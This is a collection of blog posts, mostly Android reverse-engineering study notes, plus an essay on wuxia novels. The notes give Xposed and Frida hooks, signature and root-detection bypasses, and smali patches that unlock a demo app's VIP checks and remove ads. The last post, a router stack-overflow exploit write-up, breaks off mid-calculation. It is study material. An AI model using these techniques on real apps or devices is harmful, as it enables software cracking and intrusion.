[{"content":"密码学基础\r明文：原始消息 密文：加密后的消息 加密：从明文到密文的变换过程 解密：从密文到明文的变换过程 密钥：相用来完成加解密等过程的秘密信息 对称加密\rAES加密和解密使用的是相同的密钥\n非对称加密\rRSA发送方使用公钥进行加密，接收方使用私钥进行解密（每次加密得到的密文不同）\nDH密钥交换双方协商相同的算法参数，使用各自的私钥加密后生成公钥进行交换，再把交换后的使用自己的私钥处理得到相同的密钥。\nHash\r哈希算法是一种将任意长度的输入（如文本、文件等）通过算法转换为固定长度的输出（称为哈希值或摘要）的函数。这个过程是不可逆的，即无法通过哈希值还原出原始数据。常见的哈希算法包括 MD5、SHA-1、SHA-256 等。\n特点：高敏感性（一个字符的变化都会导致hash值巨大变化）、抗碰撞性（不同的输入尽量不会产生相同的hash值）\n消息认证码（MAC）\r在单向散列函数的基础上，增添共享密钥进行认证，但是这个密钥会存在分发问题。\n数字证书CA\r为了确认公钥持有者的身份，让一个可信的第三方来对公钥进行签名，这个可信的第三方，称之为Certificate authorities（CA）。\n参考以及拓展阅读：TLS协议\n常见编码\rBase64编码\rBase64是一种用64个字符表示任意二进制数据的方法，是一种编码，并非加密字符编码，由 A-Z a-z 0-9 + / 和补充字符 “=” 组成，Base64编码后的字符数是4的倍数（不足会补\u0026quot;=\u0026quot;）\nHex编码\rhex编码，又称十六进制编码(也称base16)，一般用于方便人们查看二进制文件内容，它将字节数据中的每4个bit使用数字(0-9)、字母(A-F)共16个字符等效表示，由于一个字节有8个bit，所以一个字节会被编码为2个hex字符 PS:在 ASCII 编码中，只有0到127之间的数字是表示英文字母、数字和符号的，超出这个范围的字符需要使用其他编码方式,例如汉字就需要使用 UTF-8 或 UTF-16\nUnicode编码\rUnicode 是一种字符编码标准，旨在为世界上所有的文字、符号和表情符号分配唯一的编码，以解决不同语言和字符集之间的不兼容问题。Unicode 编码目前广泛用于互联网、操作系统、编程语言和数据库系统。\n非标准加密对抗\r主动调用 补全代码还原算法（Chatgpt发力区间） 课后作业\r修改教程demo中的值\n思路：jadx定位，xposed模块编写hook去修改\n","date":"2024-10-24T10:14:13+08:00","permalink":"https://zhu1ang.github.io/p/52study_7/","title":"安卓逆向入门（七）"},{"content":"Xposed介绍\rXposed框架原理是部署在ROOT后的安卓手机上，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。可以让我们在不修改APK源码的情况下，通过自己编写的模块来影响程序运行的框架服务，实现类似于自动抢红包、微信消息自动回复等功能。 根据官方tutorial，典型的插件开发流程分为：\n1 2 3 4 加入Xposed Framework API 修改AndroidManifest.xml 编写hook代码 将类注册到assets/xposed_init文件中去 Xposed模块编写\r1.Android Studio创建新项目 2.将下载的xposedBridgeApi.jar包拖进libs文件夹 3.右击jar包，选择add as library 4.修改xml文件配置\n注意：这里可能会因为最开始配置Android studio的时候未设置正确的代理导致build失败，参考：掘金文章\n再将下载的xposedBridgeApi.jar包拖进libs文件夹，右击jar包，选择add as library等待完成后，然后在app/src/main/res/Android Manifest.xml里添加如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- 是否是xposed模块，xposed根据这个来判断是否是模块 --\u0026gt; \u0026lt;meta-data android:name=\u0026#34;xposedmodule\u0026#34; android:value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;!-- 模块描述，显示在xposed模块列表那里第二行 --\u0026gt; \u0026lt;meta-data android:name=\u0026#34;xposeddescription\u0026#34; android:value=\u0026#34;这是一个Xposed模块\u0026#34; /\u0026gt; \u0026lt;!-- 最低xposed版本号(lib文件名可知) --\u0026gt; \u0026lt;meta-data android:name=\u0026#34;xposedminversion\u0026#34; android:value=\u0026#34;89\u0026#34; /\u0026gt; Android手机连接Android studio后点击运行，即可在Android上成功安装app并且LSPosed模块里也能看到新建的模块\n5.修改build.gradle,将此处修改为compileOnly 默认的是implementation\n6.新建\u0026ndash;\u0026gt;Folder\u0026ndash;\u0026gt;Assets Folder，创建xposed_init(不要后缀名):只有一行代码，就是说明入口类 7.新建Hook类，实现IXposedHookLoadPackage接口，然后在handleLoadPackage函数内编写Hook逻辑\nXposed API\r以hook普通方法为例子，首先使用Logcat捕获日志，并且打开教程demo，过滤出第七关的日志输出\n使用jadx打开demo.apk，查看demo类，找到需要hook的代码，复制为xposed代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 XposedHelpers.findAndHookMethod(\u0026#34;com.zj.wuaipojie.Demo\u0026#34;, loadPackageParam.classLoader, \u0026#34;a\u0026#34;, String.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(param.args[0].toString()); String a = \u0026#34;changed method\u0026#34;; param.args[0] = a; XposedBridge.log(param.args[0].toString()); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); } }); 复制到hook类里，并且进行参数的修改。\n然后重新运行，并且在LSposed里启用编写的模块并且勾选教程demo，重新捕获日志，可以看到，已经成功修改了参数。\n","date":"2024-10-17T15:31:16+08:00","permalink":"https://zhu1ang.github.io/p/52study_6/","title":"安卓逆向入门（六）"},{"content":"APK签名校验\r通过对 Apk 进行签名，开发者可以证明对 Apk 的所有权和控制权，可用于安装和更新其应用。而在 Android 设备上的安装 Apk ，如果是一个没有被签名的 Apk，则会被拒绝安装。在安装 Apk 的时候，软件包管理器也会验证 Apk 是否已经被正确签名，并且通过签名证书和数据摘要验证是否合法没有被篡改。只有确认安全无篡改的情况下，才允许安装在设备上。\n简单来说，APK 的签名主要作用有两个：\n证明 APK 的所有者。 允许 Android 市场和设备校验 APK 的正确性。 Android 目前支持以下四种应用签名方案： v1 方案：基于 JAR 签名。 v2 方案：APK 签名方案 v2（在 Android 7.0 中引入） v3 方案：APK 签名方案 v3（在 Android 9 中引入） v4 方案：APK 签名方案 v4（在 Android 11 中引入）\nV1 签名的机制主要就在 META-INF 目录下的三个文件，MANIFEST.MF，ANDROID.SF，ANDROID.RSA，他们都是 V1 签名的产物。 （1）MANIFEST.MF：这是摘要文件。程序遍历Apk包中的所有文件(entry)，对非文件夹非签名文件的文件，逐个用SHA1(安全哈希算法)生成摘要信息，再用Base64进行编码。如果你改变了apk包中的文件，那么在apk安装校验时，改变后的文件摘要信息与MANIFEST.MF的检验信息不同，于是程序就不能成功安装。\n（2）ANDROID.SF：这是对摘要的签名文件。对前一步生成的MANIFEST.MF，使用SHA1-RSA算法，用开发者的私钥进行签名。在安装时只能使用公钥才能解密它。解密之后，将它与未加密的摘要信息（即，MANIFEST.MF文件）进行对比，如果相符，则表明内容没有被异常修改。\n（3）ANDROID.RSA文件中保存了公钥、所采用的加密算法等信息。\n签名校验对抗\r方法一:核心破解插件，不签名安装应用 方法二:一键过签名工具，例如MT、NP、ARMPro、CNFIX、Modex的去除签名校验功能 方法三:具体分析签名校验逻辑(手撕签名校验) 方法四:io重定向\u0026ndash;VA\u0026amp;SVC：ptrace+seccomp\n手动实现PM代理\rHOOK PMS\n有一些过时，源码可以看一下，使用也可以了解了解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package com.zj.hookpms; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import android.content.Context; import android.content.pm.PackageManager; import android.util.Log; public class ServiceManagerWraper { public final static String ZJ = \u0026#34;ZJ595\u0026#34;; public static void hookPMS(Context context, String signed, String appPkgName, int hashCode) { try { // 获取全局的ActivityThread对象 Class\u0026lt;?\u0026gt; activityThreadClass = Class.forName(\u0026#34;android.app.ActivityThread\u0026#34;); Method currentActivityThreadMethod = activityThreadClass.getDeclaredMethod(\u0026#34;currentActivityThread\u0026#34;); Object currentActivityThread = currentActivityThreadMethod.invoke(null); // 获取ActivityThread里面原始的sPackageManager Field sPackageManagerField = activityThreadClass.getDeclaredField(\u0026#34;sPackageManager\u0026#34;); sPackageManagerField.setAccessible(true); Object sPackageManager = sPackageManagerField.get(currentActivityThread); // 准备好代{过}{滤}理对象, 用来替换原始的对象 Class\u0026lt;?\u0026gt; iPackageManagerInterface = Class.forName(\u0026#34;android.content.pm.IPackageManager\u0026#34;); Object proxy = Proxy.newProxyInstance( iPackageManagerInterface.getClassLoader(), new Class\u0026lt;?\u0026gt;[]{iPackageManagerInterface}, new PmsHookBinderInvocationHandler(sPackageManager, signed, appPkgName, 0)); // 1. 替换掉ActivityThread里面的 sPackageManager 字段 sPackageManagerField.set(currentActivityThread, proxy); // 2. 替换 ApplicationPackageManager里面的 mPM对象 PackageManager pm = context.getPackageManager(); Field mPmField = pm.getClass().getDeclaredField(\u0026#34;mPM\u0026#34;); mPmField.setAccessible(true); mPmField.set(pm, proxy); } catch (Exception e) { Log.d(ZJ, \u0026#34;hook pms error:\u0026#34; + Log.getStackTraceString(e)); } } public static void hookPMS(Context context) { String Sign = \u0026#34;原包的签名信息\u0026#34;; hookPMS(context, Sign, \u0026#34;com.zj.hookpms\u0026#34;, 0); } } IO重定向\rIO重定向可以干嘛？\n1，可以让文件只读，不可写\n2，禁止访问文件\n3，路径替换\n具体实现： 过签名检测(读取原包) 风控对抗(例:一个文件记录App启动的次数) 过Root检测，Xposed检测(文件不可取)\n普通签名校验\r在jadx里定位到校验的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 private final boolean checkSign(Context context) { try { for (Signature signature : context.getPackageManager().getPackageInfo(context.getPackageName(), 64).signatures) { MessageDigest messageDigest = MessageDigest.getInstance(\u0026#34;SHA\u0026#34;); messageDigest.update(signature.toByteArray()); String encodeToString = Base64Utils.INSTANCE.encodeToString(messageDigest.digest()); Log.e(\u0026#34;zj2595\u0026#34;, \u0026#34;sign:\u0026#34; + encodeToString); if (!Intrinsics.areEqual(this.SIGNATURE, encodeToString)) { return false; } } return true; } catch (Exception e) { e.printStackTrace(); return true; } } 1 private final String SIGNATURE = \u0026#34;h99Ici0iopj8tC6NkfqyJgs73ss=\u0026#34;; 使用MT管理器在classdex文件中定位到相关校验的位置，使用算法助手输出日志，在日志中可以查看到修改之后的签名校验，进行替换。新的API签名校验也可这样绕过。\nCRC校验\r1 2 3 4 5 6 7 sget-object p10, Lcom/zj/wuaipojie/util/ContextUtils;-\u0026gt;INSTANCE:Lcom/zj/wuaipojie/util/ContextUtils; invoke-virtual {p10}, Lcom/zj/wuaipojie/util/ContextUtils;-\u0026gt;getContext()Landroid/content/Context; move-result-object p10 invoke-static {p10}, Lcom/zj/wuaipojie/util/SecurityUtil;-\u0026gt;hook(Landroid/content/Context;)V 调用教程作者已经写好的方法（在checkcrc方法被调用之前进行调用），使得进行crc校验以及hash校验的时候重定向到未修改的包。\nhook open、openat等读取文件的底层函数\n其他校验\rroot检测\n反制手段 1.算法助手、对话框取消等插件一键hook 2.分析具体的检测代码 3.利用IO重定向使文件不可读 4.修改Andoird源码，去除常见指纹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 fun isDeviceRooted(): Boolean { return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() } fun checkRootMethod1(): Boolean { val buildTags = android.os.Build.TAGS return buildTags != null \u0026amp;\u0026amp; buildTags.contains(\u0026#34;test-keys\u0026#34;) } fun checkRootMethod2(): Boolean { val paths = arrayOf(\u0026#34;/system/app/Superuser.apk\u0026#34;, \u0026#34;/sbin/su\u0026#34;, \u0026#34;/system/bin/su\u0026#34;, \u0026#34;/system/xbin/su\u0026#34;, \u0026#34;/data/local/xbin/su\u0026#34;, \u0026#34;/data/local/bin/su\u0026#34;, \u0026#34;/system/sd/xbin/su\u0026#34;, \u0026#34;/system/bin/failsafe/su\u0026#34;, \u0026#34;/data/local/su\u0026#34;, \u0026#34;/su/bin/su\u0026#34;) for (path in paths) { if (File(path).exists()) return true } return false } fun checkRootMethod3(): Boolean { var process: Process? = null return try { process = Runtime.getRuntime().exec(arrayOf(\u0026#34;/system/xbin/which\u0026#34;, \u0026#34;su\u0026#34;)) val bufferedReader = BufferedReader(InputStreamReader(process.inputStream)) bufferedReader.readLine() != null } catch (t: Throwable) { false } finally { process?.destroy() } } 模拟器检测\n通过检测系统的 Build 对象来判断当前设备是否为模拟器。具体方法是检测 Build.FINGERPRINT 属性是否包含字符串 \u0026quot;generic\u0026quot;。\n反调试检测\n链接\nsmali赋值\rint型\nconst/4 最大只允许存放4个二进制位(4bit)， const/16 最大值允许存放16个二进制位(16bit)， 第一位(即最高位)默认为符号位。\nlong型\nonst-wide vx, lit32 表示将一个 32 位的常量存储到 vx 与 vx+1 两个寄存器中 —— 即一个 long 类型的数据\n变量赋值\n","date":"2024-10-14T14:42:45+08:00","permalink":"https://zhu1ang.github.io/p/52study_5/","title":"安卓逆向入门（五）"},{"content":"动态调试\r修改权限\r方法一:在AndroidManifest.xml里添加可调试权限\n1 android:debuggable=\u0026#34;true\u0026#34; 方法二：XappDebug模块hook对应的ap\n方法三：Magisk命令(重启失效)\n1 2 3 4 adb shell #adb进入命令行模式 su #切换至超级用户 magisk resetprop ro.debuggable 1 stop;start; #一定要通过该方式重启 方法四:刷入MagiskHide Props Config模块\n可以参考：MagiskHidePropsConf开启全局调试\n下断点\r根据提示，在jeb里进行字符串搜索，定位进行密钥判断的代码\n分析逻辑后，在check函数的返回值一行下断点\ndebug模式启动\r1 adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity adb shell am start -D -n 包名/类名\n然后在jeb里面进行调试器attcah\n在教程demo里再次输入密钥，断下来之后可以直接next然后查看check函数的返回值，也就是密钥。\n但是这里我在jeb里无法看到变量值，而且运行调试会卡死再断掉，故使用frida进行hook查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 Java.perform(function () { // 获取目标类 var Encode = Java.use(\u0026#39;com.zj.wuaipojie.Encode\u0026#39;); var Base64Utils = Java.use(\u0026#39;com.zj.wuaipojie.util.Base64Utils\u0026#39;); // Hook Encode.encode 方法 Encode.encode.implementation = function (input) { console.log(\u0026#39;Encode.encode 被调用，输入: \u0026#39; + input); // 调用原始方法 var result = this.encode(input); console.log(\u0026#39;Encode.encode 输出: \u0026#39; + result); return result; }; // Hook Base64Utils.encodeToString 方法 Base64Utils.encodeToString.overload(\u0026#39;[B\u0026#39;).implementation = function (bytes) { // 打印 bytes 内容 console.log(\u0026#39;bytes content:\u0026#39;); // 转换 bytes 为十六进制字符串 var hexString = \u0026#39;\u0026#39;; for (var i = 0; i \u0026lt; bytes.length; i++) { hexString += (\u0026#39;0\u0026#39; + (bytes[i] \u0026amp; 0xff).toString(16)).slice(-2) + \u0026#39; \u0026#39;; } console.log(hexString.trim()); // 调用原始方法获取 Base64 编码结果 var base64String = this.encodeToString(bytes); // 打印 Base64 编码结果 console.log(\u0026#39;Base64 编码结果: \u0026#39; + base64String); // 返回原始 Base64 编码结果 return base64String; }; }); log插桩\rLog插桩指的是反编译APK文件时，在对应的smali文件里，添加相应的smali代码，将程序中的关键信息，以log日志的形式进行输出。\n1 invoke-static {对应寄存器}, Lcom/mtools/LogUtils;-\u0026gt;v(Ljava/lang/Object;)V ","date":"2024-09-26T13:57:41+08:00","permalink":"https://zhu1ang.github.io/p/52study_4/","title":"安卓逆向入门（四）"},{"content":"去广告\r广告类型：启动广告、更新广告、横幅广告等\n启动广告流程：启动Activity——广告Activity——主页Activity\n修改方法：\n修改加载时间 Activity切换定位 修改加载时间\r首先使用MT管理器的Activity记录功能，找到广告Activity的类名，然后通过搜索这个类名，定位到加载广告的代码段。\n通过java代码理清逻辑找到要修改的加载时间， 然后在smali代码相应的位置进行修改，重新安装后可以看到，仍然是加载了Ad这个广告类，但是时间很短，所以看起来是直接进入了挑战界面。\nActivity切换\r通过搜索广告类的smali的类名，从而找到真正调用这个类创建实例的地方，可以从这里的代码看到，ChallengeSecond和ChallengeForth之间是AdActivity，那么把这里修改成ChallengeThird即可（修改smali代码）\n而且这种方法不用再加载Ad那个广告类\nActivity生命周期\r弹窗定位\u0026amp;堆栈分析\r修改方法： 1.修改xml中的versiocode 2.Hook弹窗(推荐算法助手开启弹窗定位) 3.修改dex弹窗代码 4.抓包修改响应体(也可以路由器拦截)\n算法助手hook，通过定位弹窗功能可以使用返回键取消弹窗，屏蔽关键词弹窗可以直接将弹窗屏蔽，转到ChallengeThird Activity。\n通过算法助手的日志可以查看到广告弹窗的堆栈调用，然后可以在MT管理器去搜索\n这里将一号广告弹窗的show方法注释掉之后，再打开直接会弹出二号广告弹窗。\n开发者助手抓布局\r通过开发助手抓取横幅广告的布局，然后通过xml搜索定位到位置，通过修改布局宽度和高度都为0或者直接使用android:visibility=\u0026quot;gone\u0026quot;来隐藏广告布局。\n两种方法都是有效。\n其他\r在做作业demo的时候无意中打开NP管理器，突然发现NP管理器会一直弹更新广告，学以致用发现，利用好算法助手的定位功能确实可以去掉更新广告。\n","date":"2024-09-15T21:07:19+08:00","permalink":"https://zhu1ang.github.io/p/52study_3/","title":"安卓逆向入门（三）"},{"content":"smali及其语法\r​\tsmali是由dex反编译得到的，不能直接修改java代码，而是修改smali代码。\n关键字\n.class 类名 .super 父类名，继承的上级类名名称 .source 源名 .field 变量 .method 方法名 .register 寄存器 .end method 方法名的结束 public 公有 protected 半公开，只有同一家人才能用 private 私有，只能自己使用 .parameter 方法参数 .prologue 方法开始 .line xxx 位于第xxx行 数据类型对应\nV void 无返回值 Z boolean 布尔值类型，返回0或1 B byte 字节类型，返回字节 S short 短整数类型，返回数字 C char 字符类型，返回字符 I int 整数类型，返回数字 J long （64位 需要2个寄存器存储） 长整数类型，返回数字 F float 单浮点类型，返回数字 D double （64位 需要2个寄存器存储） 双浮点类型，返回数字 string String 文本类型，返回字符串 Lxxx/xxx/xxx object 对象类型，返回对象 常用指令\nconst 重写整数属性，真假属性内容，只能是数字类型 const-string 重写字符串内容 const-wide 重写长整数类型，多用于修改到期时间。 return 返回指令 if-eq 全称equal(a=b)，比较寄存器ab内容，相同则跳 if-ne 全称not equal(a!=b)，ab内容不相同则跳 if-eqz 全称equal zero(a=0)，z即是0的标记，a等于0则跳 if-nez 全称not equal zero(a!=0)，a不等于0则跳 if-ge 全称greater equal(a\u0026gt;=b)，a大于或等于则跳 if-le 全称little equal(a\u0026lt;=b)，a小于或等于则跳 goto 强制跳到指定位置 switch 分支跳转，一般会有多个分支线，并根据指令跳转到适当位置 iget 获取寄存器数据 smali代码分析\rdemo的第二关\n目标是一键三连，但是提示需要获取大会员，尝试修改smali代码。\n首先使用jadx反编译然后搜索特定字符串(jadx抽风了，这里改用jeb)，定位到字符串的位置，同时可以按tab键查看对应的java代码\n实战修改\r修改判断\r理清修改的逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 00000000 iget p0, p0, Ref$IntRef-\u0026gt;element:I 00000004 const/4 p5, 1 00000006 const/16 v0, 10 0000000A if-ge p0, v0, :2A :E 0000000E move-object p0, p1 00000010 check-cast p0, Context 00000014 const-string v0, \u0026#34;请先获取10个硬币哦\u0026#34; 00000018 check-cast v0, CharSequence 0000001C invoke-static Toast-\u0026gt;makeText(Context, CharSequence, I)Toast, p0, v0, p5 00000022 move-result-object p0 00000024 invoke-virtual Toast-\u0026gt;show()V, p0 :2A 0000002A invoke-virtual ChallengeSecond-\u0026gt;isvip()Z, p1 00000030 move-result p0 00000032 if-eqz p0, :86 :36 00000036 check-cast p1, Context 0000003A const-string p0, \u0026#34;当前已经是大会员了哦！\u0026#34; 0000003E check-cast p0, CharSequence 00000042 invoke-static Toast-\u0026gt;makeText(Context, CharSequence, I)Toast, p1, p0, p5 00000048 move-result-object p0 0000004A invoke-virtual Toast-\u0026gt;show()V, p0 00000050 const p0, 0x7F0D0018 # mipmap:zan_active 00000056 invoke-virtual ImageView-\u0026gt;setImageResource(I)V, p2, p0 0000005C const p0, 0x7F0D0008 # mipmap:coin_active 00000062 invoke-virtual ImageView-\u0026gt;setImageResource(I)V, p3, p0 00000068 const p0, 0x7F0D000A # mipmap:collect_active 0000006E invoke-virtual ImageView-\u0026gt;setImageResource(I)V, p4, p0 00000074 sget-object p0, SPUtils-\u0026gt;INSTANCE:SPUtils 00000078 const/4 p2, 2 0000007A const-string p3, \u0026#34;level\u0026#34; 0000007E invoke-virtual SPUtils-\u0026gt;saveInt(Context, String, I)V, p0, p1, p3, p2 00000084 goto :A0 :86 00000086 check-cast p1, Context 0000008A const-string p0, \u0026#34;请先充值大会员哦！\u0026#34; 0000008E check-cast p0, CharSequence 00000092 invoke-static Toast-\u0026gt;makeText(Context, CharSequence, I)Toast, p1, p0, p5 00000098 move-result-object p0 0000009A invoke-virtual Toast-\u0026gt;show()V, p0 :A0 000000A0 return p5 首先第四行的判断是否有10个硬币，有则跳转:2A去判断是否是会员。:2A里的第16行判断是否是vip不是则跳转到:86。理清修改逻辑后去MT管理器里进行修改。\n第一个硬币判断由\u0026gt;=10改为\u0026lt;=10，而对于不是大会员的跳转分支直接注释。\n修改寄存器的值\r首先第一处判断，把需要的硬币数改为0，第二处把vip判断函数的返回值直接设为1。\n强制跳转\r首先第一跳转，可以直接修改goto到cond_15直接进行是否是会员的判断，而对于是否是会员判断完，添加一个goto跳转并且在是大会员的分支添加要跳转的标签。（这里也可以注释删除，但是如果代码逻辑是先判断不是大会员再else是大会员就不能这样操作）\n其他\r这次实战只是一个简单的栗子，对于这种技巧需要掌握应该需要多动手，多看smali，多改。\n参考\r吾爱教程：https://www.52pojie.cn/thread-408645-1-1.html\n​\n","date":"2024-09-14T21:39:03+08:00","permalink":"https://zhu1ang.github.io/p/52study_2/","title":"安卓逆向入门（二）"},{"content":"前言\r由于买的测试机还没有到手，所以这几天找逆向教程乱找都没合适的，今天突然发现这个吾爱破解的教程第一节竟然是模拟器环境搭建，甚是对我的需求，于是直接开干（后续真机到手也在真机上搞搞）\napk双开\r操作：修改包名\n原理：让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP 操作：修改Framework\n原理：对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开 操作：通过虚拟化技术实现\n原理：虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间 操作：以插件机制运行\n原理：利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp 身为xdx，带佬只教第一种，那么先操作第一种\n使用NP管理器的APK共存功能（MT会员功能），修改不同的包名然后直接安装即可得到两个52pj的demo，如果存在签名校验则会有安装闪退等崩溃情况出现。\n汉化\r首先，在res/资源目录下使用MT管理器搜素Hello这个字符串，然后进行修改，并且更新，重新安装\n而对于下面的英文和未知文字则可以使用开发者助手提取页面资源进行搜索匹配。\n初识AndroidManifest.xml\r小测试\r替换demo第一关的图片\n根据对apk结构的一个初步认识。图片等资源应该是在res/目录下，进去寻找找到图片之后，直接替换掉。\n参考\r吾爱教程：https://www.52pojie.cn/thread-408645-1-1.html\n","date":"2024-09-13T18:42:43+08:00","permalink":"https://zhu1ang.github.io/p/52study/","title":"安卓逆向入门（一）"},{"content":"系统架构\r​\tAndroid是一个基于Linux的操作系统。从底层开始，依次是Linux内核层、HAL硬件抽象层（不重要）、运行库、应用框架（App Framework）、应用程序。\nLinux内核层\r​\tAndroid使用的是Linux的内核，所以Android和Linux在底层本质是一样的，提供操作系统的核心功能。\n系统运行库层\r​\t由两部分构成，一部分是C/C++编写的原生库文件，可以通过API被应用直接调用，例如：libopengl.so、libsqlite3.so。第二部分是安卓运行时库，是Android应用程序执行时的环境，在Android5.0之前使用Dalvik VM（libdvm.so）作为运行环境，之后是Art（libart.so）。\n应用框架层\r​\t提供API用于构建Android应用，可以看作是应用程序和运行库的一个接口。无论APP加壳与否，其框架层的代码在应用层加载之前就存在。\n安卓加壳了解\r​\t加壳是指对Android应用的APK文件进行额外的包装，类似于在应用的外面加了一层壳，通过这一层壳可以隐藏或保护应用的实际内容。被加壳的APK文件在启动时会先执行壳中的代码，壳的代码负责解密或加载被保护的真实应用。\n​\t加壳技术的迭代过程：\n代码混淆，将应用的类名、方法名、变量名等转换为毫无意义的字符，增加静态分析的难度 动态dex，Dex文件是Android应用中包含字节码的核心文件。加壳时，开发者会将Dex文件进行加密，只有在运行时壳程序才会解密这些Dex文件，并将其加载到内存中执行。常见的加密方式包括AES、DES等对称加密算法。 动态dex+函数抽取，得到dex反汇编查看仍然会有部分函数的内容是隐藏的。 VMP保护，将部分应用逻辑放到一个自定义的虚拟机中执行，增强对应用核心逻辑的保护。 dex2c，将java代码进行词法句法分析，生成对应的C/C++文件，然后交叉编译成so动态库 应用层\r​\t即App层，包括系统应用和自己安装的普通应用。也就是日的对象。\nAndroid四大组件\r​\tActivity（活动）、Service（服务）、Broadcast Receiver（广播接收器） 和 Content Provider（内容提供者）。\n​\tActivity 是 Android 应用中用于构建用户界面的组件。每个 Activity 都表示应用的一个可视化界面，负责与用户的交互。\n​\tService 是 Android 中的后台组件，用于执行长时间运行的操作，不需要与用户进行交互。Service 一般用于处理一些不需要用户界面但又需要长期存在的操作，如播放音乐、下载文件等。\n​\tBroadcast Receiver用于响应 来自其他应用程序或者系统的广播消息。\n​\tContent Provider 是 Android 用来实现应用间数据共享的组件，也是 Android 中处理数据共享的唯一标准方式。\n","date":"2024-09-10T10:58:46+08:00","permalink":"https://zhu1ang.github.io/p/240910/","title":"安卓逆向学习笔记（一）"},{"content":"金梁古温侠风草叙\r楔子 抚剑而拜\r​\t我大概是十三四岁的年纪开始读的武侠小说。\n​\t某个记不起日期记不起时辰的一天，我正在摆弄着我的“学习机”——形状类似笔记本电脑但是不能连接互联网，只能用来观看教学视频、做一些练习题、读一些教材解析等等。许是命定，我偶然发现竟然有许多书可以阅读，彼时正年少的自己选择了一本《多情剑客无情剑》来读，其时尚不知古龙为何人，只觉得作者和著作的名字都很吸引刚刚青春期的我。读完第一章我便被这本小说的人物故事所深深吸引，当然最最吸引我的就是古龙那打破传统武侠的写作手法，对交手两人的武功招式没有过多的描写，但是能给人极强的画面感，简洁而凌厉，彷佛感受得到透纸而出的杀气。\n​\t从那以后，读武侠小说就成为了我消遣的主要方式。不一开始读的就是古龙的成名作导致后来再去读他早期传统武侠风格作品的时候，颇有些不习惯。好再后来发现学习机的小说里竟然有金庸的作品，当时亦是不知金庸何人，但是读了几本武侠小说的我一眼便能看出来《笑傲江湖》、《书剑恩仇录》、《天龙八部》这些书名一定都是武侠小说。\n​\t如果说古龙的小说吸引我开说读武侠小说，那么金庸的作品则是让我对武侠小说真正深读下去。金庸的作品风格不同于古龙的凌厉、洒脱，相反是一种稳重、敦笃的风格。两人的作品我花了初中三年和高中两年读了个八九分，除了学习机上没有的全部读完了。\n​\t少年读武侠，无疑令人神往快意恩仇的江湖，何况自己颇为内向，也就会更频繁地在心里代入小说里的人物。身不在江湖而心在江湖，手中无剑而心中有剑。抚心拜剑，年少如此，也不枉羡风流。\n正文\r未完待续。。。\r​\n","date":"2024-09-08T22:14:29+08:00","permalink":"https://zhu1ang.github.io/p/%E5%89%91%E4%B8%8E%E8%8A%B1%E9%85%92%E4%B8%8E%E8%A1%80/","title":"剑与花、酒与血"},{"content":"前期准备\r固件下载链接：TEW752\n静态分析\r根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析\n函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。\n但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现\n同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件\n分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：\n并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据：\n考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。\n模拟路由器环境\n构造HTTP请求（溢出HTTP_SID/SERVICE）\nTCP scoket来发送请求\n路由器模拟\r使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。\n动态调试\r1 测偏移\r先用cyclic 2000 \u0026gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式\n1 2 3 4 5 #!/bin/bash service=\u0026#34;?service=`cat test`\u0026#34; qemu-mipsel-static -L ./ -g 1234 -0 \u0026#34;gena.cgi\u0026#34; -E REQUEST_METHOD=\u0026#34;UNSUBSCRIBE\u0026#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=\u0026#34;192.168.182.14\u0026#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474\n2 找基址\r由于使用vmmap命令无法得到libc的基址\n所以，这里仍然根据延迟绑定机制来计算libc的基址\n0x3ff8a060 - 0x52060 = 